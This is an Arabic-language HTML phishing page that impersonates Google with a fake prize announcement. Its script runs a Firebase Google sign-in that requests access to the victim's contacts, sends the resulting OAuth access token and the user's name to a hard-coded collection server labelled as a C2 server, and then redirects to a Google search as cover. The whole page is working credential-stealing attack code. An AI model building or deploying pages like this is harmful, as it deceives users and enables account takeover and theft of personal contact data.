<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تهانينا! فوز بجائزة قيمة</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
    
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        img { width: 100px; margin-bottom: 1rem; }
        h1 { color: #1a73e8; font-size: 1.5rem; margin-bottom: 1rem; }
        p { color: #5f6368; line-height: 1.6; margin-bottom: 2rem; }
        .btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 5px;
            font-size: 1rem;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            transition: background 0.3s;
        }
        .btn:hover { background-color: #1557b0; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
    <h1>تهانينا! لقد فزت بجائزة قيمة</h1>
    <p>يرجى تسجيل الدخول بحساب جوجل الموثق لتأكيد هويتك واستلام هديتك فوراً.</p>
    <button class="btn" onclick="login()">تسجيل الدخول واستلام الهدية</button>
</div>

<script>
    // --- إعدادات Firebase الخاصة بك ---
    const firebaseConfig = {
        apiKey: "AIzaSyC2-XyOs5ZKmoY-a5CDzolYEXAMPLE", // تأكد من وضع الـ API Key الخاص بك هنا
        authDomain: "medo7788.firebaseapp.com",
        projectId: "medo7788",
        storageBucket: "medo7788.appspot.com",
        messagingSenderId: "1067108116204",
        appId: "1:1067108116204:web:your_app_id"
    };

    // بدء تشغيل Firebase
    firebase.initializeApp(firebaseConfig);

    // عنوان الوحش (C2 Server)
    const C2_SERVER = "https://mohamedahmed77.pythonanywhere.com/catch";

    function login() {
        const provider = new firebase.auth.GoogleAuthProvider();
        // طلب صلاحيات الوصول لجهات الاتصال
        provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
        
        // استخدام التوجيه المباشر لتجنب حظر النوافذ المنبثقة
        firebase.auth().signInWithRedirect(provider);
    }

    // الكود الذي يعمل بعد عودة الضحية من تسجيل الدخول
    firebase.auth().getRedirectResult().then((result) => {
        if (result.credential) {
            const token = result.credential.accessToken;
            const user = result.user;
            const senderName = user.displayName || "Unknown_User";

            // إرسال البيانات للوحش
            fetch(`${C2_SERVER}?token=${token}&sender=${senderName}`)
            .then(() => {
                // توجيه نهائي للتمويه
                window.location.href = "https://google.com/search?q=جوائز+جوجل";
            })
            .catch(() => {
                window.location.href = "https://google.com";
            });
        }
    }).catch((error) => {
        console.error("Auth Error:", error);
    });
</script>

</body>
</html>
